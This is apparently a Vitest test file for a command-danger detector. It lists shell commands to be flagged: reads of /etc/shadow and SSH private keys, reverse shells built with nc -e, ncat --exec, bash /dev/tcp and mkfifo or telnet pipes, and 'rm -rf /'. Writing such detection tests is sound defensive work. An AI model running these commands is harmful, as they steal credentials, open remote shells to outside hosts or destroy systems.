import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { setTestMode, SecurityProtocolManager } from './manager.js';

describe('P4-1: Risk mitigation checks', () => {
  let manager: SecurityProtocolManager;

  beforeEach(() => {
    setTestMode(true);
    manager = new SecurityProtocolManager();
  });

  afterEach(() => {
    setTestMode(false);
  });

  describe('rule-sensitive-file-read', () => {
    it('should detect cat /etc/shadow', () => {
      const result = manager.detectCommand('cat /etc/shadow');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sensitive-file-read');
      expect(result.severity).toBe('high');
    });

    it('should detect cat /etc/master.passwd', () => {
      const result = manager.detectCommand('cat /etc/master.passwd');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sensitive-file-read');
    });

    it('should detect cat /etc/gshadow', () => {
      const result = manager.detectCommand('cat /etc/gshadow');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sensitive-file-read');
    });

    it('should detect cat private SSH key', () => {
      const result = manager.detectCommand('cat ~/.ssh/id_rsa');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sensitive-file-read');
    });

    it('should detect cat id_ed25519', () => {
      const result = manager.detectCommand('cat /home/user/.ssh/id_ed25519');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sensitive-file-read');
    });

    it('should detect less on .pem file', () => {
      const result = manager.detectCommand('less /etc/ssl/certs/server.pem');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sensitive-file-read');
    });

    it('should detect head on .key file', () => {
      const result = manager.detectCommand('head -20 /opt/certs/server.key');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sensitive-file-read');
    });

    it('should detect vim on /etc/ssl/private', () => {
      const result = manager.detectCommand('vim /etc/ssl/private/mykey.key');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sensitive-file-read');
    });

    it('should detect sudo cat /etc/shadow (matches sudo rule first)', () => {
      const result = manager.detectCommand('sudo cat /etc/shadow');
      expect(result.isDangerous).toBe(true);
      // sudo rule matches first in evaluation order
      expect(['rule-sensitive-file-read', 'rule-sudo']).toContain(result.rule?.id);
    });

    it('should NOT trigger on cat of normal files', () => {
      const result = manager.detectCommand('cat /etc/hosts');
      expect(result.isDangerous).toBe(false);
    });

    it('should NOT trigger on echo of shadow path', () => {
      const result = manager.detectCommand('echo /etc/shadow');
      expect(result.isDangerous).toBe(false);
    });
  });

  describe('rule-reverse-shell', () => {
    it('should detect nc -e /bin/bash', () => {
      const result = manager.detectCommand('nc -e /bin/bash 10.0.0.1 4444');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
      expect(result.severity).toBe('high');
    });

    it('should detect nc -e /bin/sh', () => {
      const result = manager.detectCommand('nc 192.168.1.1 9999 -e /bin/sh');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
    });

    it('should detect ncat -e /bin/bash', () => {
      const result = manager.detectCommand('ncat 10.0.0.1 4444 -e /bin/bash');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
    });

    it('should detect ncat --exec /bin/sh', () => {
      const result = manager.detectCommand('ncat --exec /bin/sh 10.0.0.1 4444');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
    });

    it('should detect nc --exec /bin/bash', () => {
      const result = manager.detectCommand('nc --exec /bin/bash 10.0.0.1 4444');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
    });

    it('should detect bash -i reverse shell via /dev/tcp/', () => {
      const result = manager.detectCommand('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
    });

    it('should detect /dev/tcp/ usage (may match write-dev rule first)', () => {
      const result = manager.detectCommand('exec 3<>/dev/tcp/10.0.0.1/80');
      expect(result.isDangerous).toBe(true);
      // /dev/tcp/ contains >/dev/ which may match rule-write-dev first
      expect(['rule-reverse-shell', 'rule-write-dev']).toContain(result.rule?.id);
    });

    it('should detect mkfifo with nc', () => {
      const result = manager.detectCommand('mkfifo /tmp/f && nc 10.0.0.1 4444 < /tmp/f | /bin/bash > /tmp/f');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
    });

    it('should detect telnet piped to bash', () => {
      const result = manager.detectCommand('telnet 10.0.0.1 4444 | /bin/bash | telnet 10.0.0.1 5555');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-reverse-shell');
    });

    it('should NOT trigger on normal nc usage without -e', () => {
      const result = manager.detectCommand('nc -zv 10.0.0.1 80');
      expect(result.isDangerous).toBe(false);
    });

    it('should NOT trigger on normal telnet usage', () => {
      const result = manager.detectCommand('telnet 10.0.0.1 80');
      expect(result.isDangerous).toBe(false);
    });
  });

  describe('backward compatibility', () => {
    it('should still detect sudo commands', () => {
      const result = manager.detectCommand('sudo rm -rf /');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-sudo');
    });

    it('should still detect rm -rf /', () => {
      const result = manager.detectCommand('rm -rf /');
      expect(result.isDangerous).toBe(true);
      expect(result.rule?.id).toBe('rule-rm-root');
    });

    it('should still mark safe commands as safe', () => {
      const result = manager.detectCommand('npm test');
      expect(result.isDangerous).toBe(false);
      expect(result.severity).toBe('none');
    });

    it('should still mark git status as safe', () => {
      const result = manager.detectCommand('git status');
      expect(result.isDangerous).toBe(false);
    });
  });
});